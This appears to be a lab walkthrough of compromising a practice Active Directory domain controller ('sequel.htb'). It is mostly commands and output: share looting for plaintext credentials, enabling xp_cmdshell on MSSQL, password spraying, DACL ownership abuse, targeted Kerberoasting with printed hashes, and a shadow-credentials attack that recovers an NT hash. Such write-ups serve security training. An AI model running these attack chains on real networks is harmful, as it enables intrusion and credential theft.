# Reconnaissance
- As is common in real life Windows pentests, you will start this box with credentials for the following account: rose / KxEPkKe6R8su
## Nmap Enumeration
- We pass the commands:
	```bash
nmap -sV -sC -vv 10.10.11.51
nmap -sU --top-ports=10 -vv 10.10.1

---OUTPUT-TCP---
PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-04-28 00:16:29Z)
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.sequel.htb
| Issuer: commonName=sequel-DC01-CA/domainComponent=sequel
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-06-08T17:35:00
| Not valid after:  2025-06-08T17:35:00
| MD5:   09fd:3df4:9f58:da05:410d:e89e:7442:b6ff
| SHA-1: c3ac:8bfd:6132:ed77:2975:7f5e:6990:1ced:528e:aac5
| -----BEGIN CERTIFICATE-----
| MIIGJjCCBQ6gAwIBAgITVAAAAANDveocXlnSDQAAAAAAAzANBgkqhkiG9w0BAQsF
| ADBGMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VxdWVs
| MRcwFQYDVQQDEw5zZXF1ZWwtREMwMS1DQTAeFw0yNDA2MDgxNzM1MDBaFw0yNTA2
| MDgxNzM1MDBaMBoxGDAWBgNVBAMTD0RDMDEuc2VxdWVsLmh0YjCCASIwDQYJKoZI
| hvcNAQEBBQADggEPADCCAQoCggEBANRCnm8pZ86LZP3kAtl29rFgY5gEOEXSCZSm
| F6Ai+1vh6a8LrCRKMWtC8+Kla0PXgjTcGcmDawcI8h0BsaSH6sQVAD21ca5MQcv0
| xf+4TzrvAnp9H+pVHO1r42cLXBwq14Ak8dSueiOLgxoLKO1CDtKk+e8ZxQWf94Bp
| Vu8rnpImFT6IeDgACeBfb0hLzK2JJRT9ezZiUVxoTfMKKuy4IPFWcshW/1bQfEK0
| ExOcQZVaoCJzRPBUVTp/XGHEW9d6abW8h1UR+64qVfGexsrUKBfxKRsHuHTxa4ts
| +qUVJRbJkzlSgyKGMjhNfT3BPVwwP8HvErWvbsWKKPRkvMaPhU0CAwEAAaOCAzcw
| ggMzMC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8AbABs
| AGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/BAQD
| AgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3DQME
| AgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjALBglg
| hkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFNfVXsrpSahW
| xfdL4wxFDgtUztvRMB8GA1UdIwQYMBaAFMZBubbkDkfWBlps8YrGlP0a+7jDMIHI
| BgNVHR8EgcAwgb0wgbqggbeggbSGgbFsZGFwOi8vL0NOPXNlcXVlbC1EQzAxLUNB
| LENOPURDMDEsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNl
| cnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9c2VxdWVsLERDPWh0Yj9jZXJ0aWZp
| Y2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0
| aW9uUG9pbnQwgb8GCCsGAQUFBwEBBIGyMIGvMIGsBggrBgEFBQcwAoaBn2xkYXA6
| Ly8vQ049c2VxdWVsLURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNl
| cnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9c2VxdWVsLERD
| PWh0Yj9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlv
| bkF1dGhvcml0eTA7BgNVHREENDAyoB8GCSsGAQQBgjcZAaASBBDjAT1NPPfwT4sa
| sNjnBqS3gg9EQzAxLnNlcXVlbC5odGIwTQYJKwYBBAGCNxkCBEAwPqA8BgorBgEE
| AYI3GQIBoC4ELFMtMS01LTIxLTU0ODY3MDM5Ny05NzI2ODc0ODQtMzQ5NjMzNTM3
| MC0xMDAwMA0GCSqGSIb3DQEBCwUAA4IBAQCBDjlZZbFac6RlhZ2BhLzvWmA1Xcyn
| jZmYF3aOXmmof1yyO/kxk81fStsu3gtZ94KmpkBwmd1QkSJCuT54fTxg17xDtA49
| QF7O4DPsFkeOM2ip8TAf8x5bGwH5tlZvNjllBCgSpCupZlNY8wKYnyKQDNwtWtgL
| UF4SbE9Q6JWA+Re5lPa6AoUr/sRzKxcPsAjK8kgquUA0spoDrxAqkADIRsHgBLGY
| +Wn+DXHctZtv8GcOwrfW5KkbkVykx8DSS2qH4y2+xbC3ZHjsKlVjoddkjEkrHku0
| 2iXZSIqShMXzXmLTW/G+LzqK3U3VTcKo0yUKqmLlKyZXzQ+kYVLqgOOX
|_-----END CERTIFICATE-----
|_ssl-date: 2025-04-28T00:17:49+00:00; 0s from scanner time.
445/tcp  open  microsoft-ds? syn-ack ttl 127
464/tcp  open  kpasswd5?     syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.sequel.htb
| Issuer: commonName=sequel-DC01-CA/domainComponent=sequel
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-06-08T17:35:00
| Not valid after:  2025-06-08T17:35:00
| MD5:   09fd:3df4:9f58:da05:410d:e89e:7442:b6ff
| SHA-1: c3ac:8bfd:6132:ed77:2975:7f5e:6990:1ced:528e:aac5
| -----BEGIN CERTIFICATE-----
| MIIGJjCCBQ6gAwIBAgITVAAAAANDveocXlnSDQAAAAAAAzANBgkqhkiG9w0BAQsF
| ADBGMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VxdWVs
<SNIP>
| +Wn+DXHctZtv8GcOwrfW5KkbkVykx8DSS2qH4y2+xbC3ZHjsKlVjoddkjEkrHku0
| 2iXZSIqShMXzXmLTW/G+LzqK3U3VTcKo0yUKqmLlKyZXzQ+kYVLqgOOX
|_-----END CERTIFICATE-----
|_ssl-date: 2025-04-28T00:17:49+00:00; 0s from scanner time.
1433/tcp open  ms-sql-s      syn-ack ttl 127 Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info: 
|   10.10.11.51:1433: 
|     Target_Name: SEQUEL
|     NetBIOS_Domain_Name: SEQUEL
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: sequel.htb
|     DNS_Computer_Name: DC01.sequel.htb
|     DNS_Tree_Name: sequel.htb
|_    Product_Version: 10.0.17763
|_ssl-date: 2025-04-28T00:17:49+00:00; 0s from scanner time.
| ms-sql-info: 
|   10.10.11.51:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-04-28T00:16:23
| Not valid after:  2055-04-28T00:16:23
| MD5:   721d:d22d:11da:bd49:9ee2:d9a8:a33e:5e6f
| SHA-1: 89ea:29be:ba7a:29c2:92ed:77e7:6a44:dbc2:64aa:5a05
| -----BEGIN CERTIFICATE-----
| MIIDADCCAeigAwIBAgIQFa7PsBQeNZVBFo+q3i/v4jANBgkqhkiG9w0BAQsFADA7
| MTkwNwYDVQQDHjAAUwBTAEwAXwBTAGUAbABmAF8AUwBpAGcAbgBlAGQAXwBGAGEA
| bABsAGIAYQBjAGswIBcNMjUwNDI4MDAxNjIzWhgPMjA1NTA0MjgwMDE2MjNaMDsx
| OTA3BgNVBAMeMABTAFMATABfAFMAZQBsAGYAXwBTAGkAZwBuAGUAZABfAEYAYQBs
| AGwAYgBhAGMAazCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAM0ByxkM
| db+QWvLvf6Uy7njDwwCsDT3WFJU2PTd61+mL1/Ko5yAtlmoHF9cx+INZG8BOhC1Y
| eYOhQ7IN6kyVAaKM1YN9N0sRiPshOsIfikjI6MQRNvs0DNcLWz/MYNbLgx9FM05x
| SZMVDtgZ1ULVOIZoX+ZdzI3l8hxLIFMur24R5biwDLN6CPI9/NdkSSaRZhA6jGv5
| pX7dvBh6WreSyamR9mYDZyaCpcIq3e32P9dqfwMPYnb4+tVcYjjdenGdWMB52Cr6
| TgX4SoDgdL0VcHK2DpAeFbVY7SdfarW3P3aYm7J5yNurWI4bVJPnGSHxakDpAvU2
| mEzzQW0pLLxhrtECAwEAATANBgkqhkiG9w0BAQsFAAOCAQEABB2f8+9bCjwyWHhu
| vvkOkCSCx7uWCx5c3bv5tP4zPzABri0mqpZAsobuoK1FuNp1/Rj5KP87i55/isv/
| LqCoG4UxpHSlVGTz4F7qAvaxedlda3j5j/J6hxUHuJT2wiPngruJ4QbSnc/WX/Ln
| Kwe4ao9aDcQmb+3SrbnjXVsY62t50vsBLILNJgtPLhiICWEvizQbFbkHdlSrOplF
| tEDpRM/MIyMQf/53MWLxrWVMJIN+c/WDlYqbuK17awMRsQZ94dVXGrkgZeXMMz5B
| IOAjF18qUKMIYGx43q2oO5eXUaee3jlWYTjnJ8fmf9Jrk5pGS1Lfp3kAWjoqUN6M
| fIPetg==
|_-----END CERTIFICATE-----
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-04-28T00:17:49+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.sequel.htb
| Issuer: commonName=sequel-DC01-CA/domainComponent=sequel
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-06-08T17:35:00
| Not valid after:  2025-06-08T17:35:00
| MD5:   09fd:3df4:9f58:da05:410d:e89e:7442:b6ff
| SHA-1: c3ac:8bfd:6132:ed77:2975:7f5e:6990:1ced:528e:aac5
| -----BEGIN CERTIFICATE-----
| MIIGJjCCBQ6gAwIBAgITVAAAAANDveocXlnSDQAAAAAAAzANBgkqhkiG9w0BAQsF
| ADBGMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VxdWVs
<SNIP>
| +Wn+DXHctZtv8GcOwrfW5KkbkVykx8DSS2qH4y2+xbC3ZHjsKlVjoddkjEkrHku0
| 2iXZSIqShMXzXmLTW/G+LzqK3U3VTcKo0yUKqmLlKyZXzQ+kYVLqgOOX
|_-----END CERTIFICATE-----
3269/tcp open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.sequel.htb
| Issuer: commonName=sequel-DC01-CA/domainComponent=sequel
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-06-08T17:35:00
| Not valid after:  2025-06-08T17:35:00
| MD5:   09fd:3df4:9f58:da05:410d:e89e:7442:b6ff
| SHA-1: c3ac:8bfd:6132:ed77:2975:7f5e:6990:1ced:528e:aac5
| -----BEGIN CERTIFICATE-----
| MIIGJjCCBQ6gAwIBAgITVAAAAANDveocXlnSDQAAAAAAAzANBgkqhkiG9w0BAQsF
| ADBGMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VxdWVs
<SNIP>
| +Wn+DXHctZtv8GcOwrfW5KkbkVykx8DSS2qH4y2+xbC3ZHjsKlVjoddkjEkrHku0
| 2iXZSIqShMXzXmLTW/G+LzqK3U3VTcKo0yUKqmLlKyZXzQ+kYVLqgOOX
|_-----END CERTIFICATE-----
|_ssl-date: 2025-04-28T00:17:49+00:00; 0s from scanner time.
5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-04-28T00:17:11
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 62012/tcp): CLEAN (Timeout)
|   Check 2 (port 18505/tcp): CLEAN (Timeout)
|   Check 3 (port 20179/udp): CLEAN (Timeout)
|   Check 4 (port 46639/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: mean: 0s, deviation: 0s, median: 0s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required


---OUTPUT-UDP---

```
---
## BloodHound
- Grab file for BloodHound enumeration:
	```bash
bloodhound-python --dns-tcp -ns 10.10.11.51 -d sequel.htb -u 'rose' -p 'KxEPkKe6R8su' -c all
```
	- Mark Rose owned
----
## SMB Enumeration
- t
	```bash
netexec smb 10.10.11.51 -p 'KxEPkKe6R8su' -u 'rose' --shares

---OUTPUT---
SMB         10.10.11.51     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.51     445    DC01             [+] sequel.htb\rose:KxEPkKe6R8su 
^[[B^[[B^[[B^[[B^[[B^[[BSMB         10.10.11.51     445    DC01             [*] Enumerated shares
SMB         10.10.11.51     445    DC01             Share           Permissions     Remark
SMB         10.10.11.51     445    DC01             -----           -----------     ------
SMB         10.10.11.51     445    DC01             Accounting Department READ            
SMB         10.10.11.51     445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.51     445    DC01             C$                              Default share
SMB         10.10.11.51     445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.51     445    DC01             NETLOGON        READ            Logon server share 
SMB         10.10.11.51     445    DC01             SYSVOL          READ            Logon server share 
SMB         10.10.11.51     445    DC01             Users           READ 
```
	- Account Department has some creds
		- Domain sequel.htb
		- username:pwd
			```bash
angela:0fwz7Q4mSpurIt99
oscar:86LxLBMgEWaKUnBG
kevin:Md9Wlq1E5bZnVDVo
sa:MSSQLP@ssw0rd!
```
- I try with winrm but they all fail. Then I try with mssqlclient and get a hit:
	```bash
impacket-mssqlclient sequel.htb/'sa:MSSQLP@ssw0rd!'@10.10.11.51
```
- I try to enable xp_cmdshell to see if i can pass commands (can use xp_dirtree but can't do much with that)
	- was disabled
- https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet
	- shows how to enable (if we have privileges)
		```bash
EXEC sp_configure 'xp_cmdshell', 1
RECONFIGURE;
```
- Then using xp_cmdshell I enumerated around and found :
	```bash
EXEC xp_cmdshell 'whoami'
EXEC xp_cmdshell 'dir "C:\SQL2019\ExpressAdv_ENU"'
EXEC xp_cmdshell 'type "C:\SQL2019\ExpressAdv_ENU\sql-Configuration.INI"'

---OUTPUT-1---
output           
--------------   
sequel\sql_svc   

NULL


---OUTPUT-2---
output                                              
-------------------------------------------------         

SQLSVCACCOUNT="SEQUEL\sql_svc"                      

SQLSVCPASSWORD="WqSZAF6CysDQbGb3"                   

SQLSYSADMINACCOUNTS="SEQUEL\Administrator"          

SECURITYMODE="SQL"                                  

SAPWD="MSSQLP@ssw0rd!"                              

ADDCURRENTUSERASSQLADMIN="False"                    

TCPENABLED="1"                                      

NPENABLED="1"                                       

BROWSERSVCSTARTUPTYPE="Automatic"                   

IAcceptSQLServerLicenseTerms=True                   

NULL
```
- We get some credentials : `sql_svc`:`WqSZAF6CysDQbGb3`
-------
- (Not working..) Alternatively can use : https://github.com/Mayter/mssql-command-tool/releases/tag/mssql
	- Can use it to get a reverse shell as sql_svc and then search for the sql INI file.
		```bash
./mssql-command-tools_Linux_amd64 --host 10.10.11.51 -u "sa" -p 'MSSQLP@ssw0rd!' -c "powershell -e yourbase64here"
   
--ON-LOCAL-MACHINE--
nc -lvnp 9999
```
		- Instead we can also pass this directly in our xp_cmdshell:
			```bash

```
---------
- Continuing
	- I try crackmapexec and we get a hit on smb but nothing for winrm.
		- SMB share doesn't give us anything new
- I check users in target:
	```bash
EXEC xp_cmdshell 'net users'
---OUTPUT---
output                                                                            
-------------------------------------------------------------------------------   
NULL                                                                              

User accounts for \\DC01                                                          

NULL                                                                              

-------------------------------------------------------------------------------   

Administrator            ca_svc                   Guest                           

krbtgt                   michael                  oscar                           

rose                     ryan                     sql_svc                         

The command completed successfully.                                               

NULL                                                                              

NULL
```
	- I have a user list. I add the extra names there and perform spray
		```bash
cat users
crackmapexec winrm 10.10.11.51 -u users -p 'WqSZAF6CysDQbGb3' -d sequel.htb --no-bruteforce

---OUTPUT-USERS---
angela
oscar
kevin
sa
ca_svc
michael
rose
ryan
sql_svc

---OUTPUT-CRACKMAPEXEC---
WINRM       10.10.11.51     5985   10.10.11.51      [+] sequel.htb\ryan:WqSZAF6CysDQbGb3 (Pwn3d!)

```
- We login to target with creds:
	```bash
evil-winrm -i 10.10.11.51 -p 'WqSZAF6CysDQbGb3' -u 'ryan'
```
	- Can grab user flag
- Mark ryan owned in BloodHound
-  Under  OUTBOUND OBJECT CONTROL > First Degree Object Control we see ryan has WriteOwner privilges over ca_svc i.e can change owner of ca_svc
	- Add owner:
		```bash
impacket-owneredit -action write -new-owner 'ryan' -target 'ca_svc' 'sequel.htb'/'ryan':'WqSZAF6CysDQbGb3'

---OUTPUT---
..
..
[*] Current owner information below
[*] - SID: S-1-5-21-548670397-972687484-3496335370-512
[*] - sAMAccountName: Domain Admins
[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=sequel,DC=htb
[*] OwnerSid modified successfully!

```
	- Add rights:
		```bash
impacket-dacledit -action 'write' -rights 'FullControl' -principal 'ryan' -target 'ca_svc' 'sequel.htb'/'ryan':'WqSZAF6CysDQbGb3'
```
	- Get hash:
		```bash
python3 /opt/targetedKerberoast/targetedKerberoast.py -v -d 'sequel.htb' -u 'ryan' -p 'WqSZAF6CysDQbGb3'

---OUTPUT---
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[+] Printing hash for (sql_svc)
$krb5tgs$23$*sql_svc$SEQUEL.HTB$sequel.htb/sql_svc*$44ac368667d49a9405c1f5555b37e0a3$c097494e025b7df4949db487ac53729677e3b138eaeb33e35695e73f71b65472e7740662e8d772233fa8d38e05adf0f0ce6b200adce96dbca585706bdd313171f09db1570311b7dd06484428ebe3a257b3224654cc13cc5f17a6dd6137f46f9688d175d62cf3a45095381adc9d6d5730cb6b0b5932f7406f89758d6b21a63d85714ea746378b8c776aed8eea57f56e848583827a6f4c1a08f5ccf4fd77b2724cb73fcad1f7aa842a1c782c751d7c4111da959719013f5bef1fd0a5610273268c50f5069ac49fa8c0ba901104d69ac4709461d0d10ca066425ffd1818197c8800a303769f53e6d40794cd85b57c44c920b59463cae7f978e7e06dd4622a9781df7d6a802999010e0a34b0b218f988c1ec853d48fb3a023de398549705e96fa540407a84a4cd6d4a367c391af4ee198b5c71ad68f6f243c46d098114d123d5a3718eada9aacf62638bb93437fe8227cca39ec81fd755402aa7464cb690d7f1fb0b0e0a05ad81a6b8a51b29bfc844a63a7ab1251e97260b7155ed580326f04d39ff4d470156a3dc9857a10033bbc4f85ca87449d8ad6d6314d43eed49d5fae362074e069daca7e6c6d6f95ca61e453b0d3836b5314961563d22b289dffb3414337e4ecc4c7cb8e29234a2b05f880cd6761822dad359703dc508e3e6e387d331beb6defa92a9a4ff25a79430ae8466f50ac4a01b02f9278e4d74cd35c0103edd244e5c89fdc01b88d5c439bf7b1b00c957a837a636def990ef4560a0c85c9f9f388776c3f508f4bdb486f5d12c34b37d0fd80a708602ee9c5f780d96887348776e26ab49f4920d89c458fb3450b96657b2a12c835a17bf8c655d22ff7392475213f5eee98140f0ba60d6b8372a3f404abb02124681a71352f0b08d888453d5d1a6ba7323595858683965de9c068f7ce6baa1614736e7f61cdd1d6bf67f16fafe6e1cf98aa6113edd3f40b1e8ccda8e4d7de6f036b63f1d1d540ee34d8b61c96ebec2203e14e6f1c52bd584906b41c3bc5826a6e911b95218d7e6ef8f135ec209fb407bbc83576aad1d0ba996f85af7bedb2c35b29f6cf8128e9ddfefb62b463bffbf97ae7857c7408003b8dc75a844fdb4503221a10d2b9d92d1e8f49831fe853970fe00b791dabad9b3f808b6f0c27a872a4a1d1637d010ec84f240bde6aedece0779c881c88e67b4a92fc58da249408fa56dce83a42aa00c0a3268aa7d2154a753f31a1927e0a9f9454805b3e21782d687e0966b77e49b1e3575ace1125c873171d1ee0b074470db9e115fef2519b2d99fd889b5e6414373ef909d4629eed2f51649b97a4b09599b529e0e221760b2ce8c3981313f13ae045218c53711abbb680d260ff7b0056d1c93d04ba45014a49e91e0d1b0cb278e881a1f8012bb974a8da7ab1a10567fce5919b2e0c9cb80c52529a7b6d8500d1604b4d2ad3f8814df5d
[+] Printing hash for (ca_svc)
$krb5tgs$23$*ca_svc$SEQUEL.HTB$sequel.htb/ca_svc*$760b414d120f6542f1ecf2207d97231f$3533b12de855ae30485bc6ebf1aa8a78a58ff8c0a50e659a27f289654fc3c357d569d4e6436aea9f11205d347c10fffd5babd2497ac25b6fcab89f35436102f2f614fdd073b52ba0d3e3c18ae184cab1f2cca6683f0677a16b7591ffb3cb0135c9042556c7487ff66dc6dd6577b775d6d26849aa4b73d3a6695e98766547b74c9cca613cf70a207755e818de686a56dd3c466729f66b102267e29aff5f5ef29612f1a6e09ce76b9773b0fa218266d1b5cd1560266db51ecb33df0b91ba383f7e89657d2077959835c78e8372a53cec3e1eb5d83d46e37c196066ac9b98ad862780f9e793702195d4f3a9f292212c8112877b22deacb629f9cc9c119978fb850e7c1e5d55eed974dce0f85800b9cc05533456683d09f00d42a88a0ad420c71a316a2d256b74c14594112dab77c96955ee32f1ddfd89b8785d0efa3e2d717e06e9f2fe61b6e2e5e416b4dea720ac6e60854e7900c7999c02e78a7bf933077fdd94ae9a354ebdc3b1f4dcd9a70b9f785e9b30174170867243e28f905e7a7d45242628b929e6561fa39f170f2ac82c546a19982c30a0dc3d4f7ecdaf1d8b53720657991ba6c1652787f7fadf6bb5c7cd1f71f957d104549b39e3da5a6f48911a3b294bbedef215f143d173fe0da679eb3ad23604af4a0712489fd9a989fd169520307b52fd1c412212e2800b860f5bc60be1221bd43b239d07b6ddaedc91e369e7920ca6ebe92a58e7e9c1fa888fac0de0e1c96dc5074a94a53fcd6bc1f8bb8260e126dde478a1b7e713f1b945930a79b868cd6c1d6faec252bdd3fe9518232b00946b84007cc64d5fd842128b61210bbbd908b63625924d00fb2849fe71d86cf80f867a2d78c30006cd3f404d6d49cd559f883245924b5e40e2199bf1771a8251533438b63f7fd29f5d7eef5678c15eae3760ef9be5460b9cddf5068cd956f21ec5fdfaf841ae12e5e6f98ea4bba47d20d31b8d3aba0dcb783bfe1fc903d1d2407ae87714382661d79aea645a0c714a9353d9bcd46fc7b02fc15949118147109e16de390aee56722b06bd9a62fd3ac5ab01b2c657a350bd076a2c7919199850050cadfbadfca1b64ab64b6bb502d0b93d960db8f2d8e6e346946b8c09af323586eb45e93174b58ddc731d178539aec2c2bc838c7c89653b12a32ab1e41e263b5ba02873334d850dbf170d773bb9ccaed417cdf0bf569f5fdf4446ae2d67c41f70525e7f984c09fc75e8e49032c2fb1ca7d53af07216801936127243e9b34c5a4e7031217e2e39ac833425ba56d0484e2db125ff13bf9c615479721b9939d6a50cb729a6ae9b36bbb1c25361c644b79aae40ae69a9ed1db1b13cc4209532ec68b2b5bc82867714c3d33299660c45f1a7c28dc4c8aede852cdbe7238ba3533bb318ee081ec788893c31b5e15aaf8bdda8075937a4dc5de66b94980b47ab3923a37a

```
- Trying to crack hash with john :
	```bash
vi hash # copy hash here
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```
	- Nothing cracks
- I then try shadow credentials attack:
	- Two ways:
		- Certipy:
			```bash
certipy shadow auto -target sequel.htb -dc-ip 10.10.11.51 -username 'ryan@sequel.htb' -password 'WqSZAF6CysDQbGb3' -account 'ca_svc'

---OUTPUT---
[*] Targeting user 'ca_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'a83f7082-2528-54ac-b9c2-ef77c5d02bae'
[*] Adding Key Credential with device ID 'a83f7082-2528-54ac-b9c2-ef77c5d02bae' to the Key Credentials for 'ca_svc'
[*] Successfully added Key Credential with device ID 'a83f7082-2528-54ac-b9c2-ef77c5d02bae' to the Key Credentials for 'ca_svc'
[*] Authenticating as 'ca_svc' with the certificate
[*] Using principal: ca_svc@sequel.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'ca_svc.ccache'
[*] Trying to retrieve NT hash for 'ca_svc'
[*] Restoring the old Key Credentials for 'ca_svc'
[*] Successfully restored the old Key Credentials for 'ca_svc'
[*] NT hash for 'ca_svc': 3b181b914e7a9d5508ea1e20bc2b7fce
```
		- pywhisker + getpkinit
			```bash
python3 /opt/pywhisker/pywhisker/pywhisker.py -d "sequel.htb" -u "ryan" -p "WqSZAF6CysDQbGb3" --target "ca_svc" --action "add"   

---OUTPUT---
[*] Searching for the target account
[*] Target user found: CN=Certification Authority,CN=Users,DC=sequel,DC=htb
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: 1dbf9c7d-a796-1e06-5060-7149da030a0c
[*] Updating the msDS-KeyCredentialLink attribute of ca_svc
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] Converting PEM -> PFX with cryptography: CtWtidlB.pfx
[+] PFX exportiert nach: CtWtidlB.pfx
[i] Passwort für PFX: bT4MxQvEBfyIDXLVosWm
[+] Saved PFX (#PKCS12) certificate & key at path: CtWtidlB.pfx
[*] Must be used with password: bT4MxQvEBfyIDXLVosWm
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
```
		- Then with getpkinit (there is some minkerberos issue with this so we need to do it via a virtual env):
			```bash
sudo su
virtualenv venv
source venv/bin/activate
pip install minikerberos
python3 /opt/PKINITtools/gettgtpkinit.py -cert-pfx CtWtidlB.pfx -pfx-pass 'bT4MxQvEBfyIDXLVosWm' sequel.htb/ca_svc ca_svc.ccache
deactivate
exit
---OUTPUT---
2025-04-28 13:57:37,032 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2025-04-28 13:57:37,078 minikerberos INFO     Requesting TGT
INFO:minikerberos:Requesting TGT
2025-04-28 13:57:44,988 minikerberos INFO     AS-REP encryption key (you might need this later):
INFO:minikerberos:AS-REP encryption key (you might need this later):
2025-04-28 13:57:44,989 minikerberos INFO     e6744c1c3867176b006bc6142325d6e8bafd8d15c3dcec5e6cb9dd1cd43b67af
INFO:minikerberos:e6744c1c3867176b006bc6142325d6e8bafd8d15c3dcec5e6cb9dd1cd43b67af
2025-04-28 13:57:44,995 minikerberos INFO     Saved TGT to file
INFO:minikerberos:Saved TGT to file

```
- Finally we grab the hash:
	```bash
export KRB5CCNAME=ca_svc.ccache
python3 /opt/PKINITtools/getnthash.py sequel.htb/ca_svc -key e6744c1c3867176b006bc6142325d6e8bafd8d15c3dcec5e6cb9dd1cd43b67af   

---OUTPUT---
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Using TGT from cache
[*] Requesting ticket to self with PAC
Recovered NT Hash
3b181b914e7a9d5508ea1e20bc2b7fce

```
- We try to check with crackmapexec:
	```bash
netexec smb 10.10.11.51 -u 'ca_svc' -H '3b181b914e7a9d5508ea1e20bc2b7fce'
netexec winrm 10.10.11.51 -u 'ca_svc' -H '3b181b914e7a9d5508ea1e20bc2b7fce'
```
	- We get a hit on smb but not winrm
		- nothing relevant in winrm\
		- Probably means account exists but we not for winrm
- I mark CA_SVC owned in bloodhound


---
- I use certipy to check for any vulnerabilitie:
	```bash
certipy find -u 'ca_svc' -hashes '3b181b914e7a9d5508ea1e20bc2b7fce' -target 10.10.11.51 -stdout -vulnerable

---OUTPUT---
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Trying to get CA configuration for 'sequel-DC01-CA' via CSRA
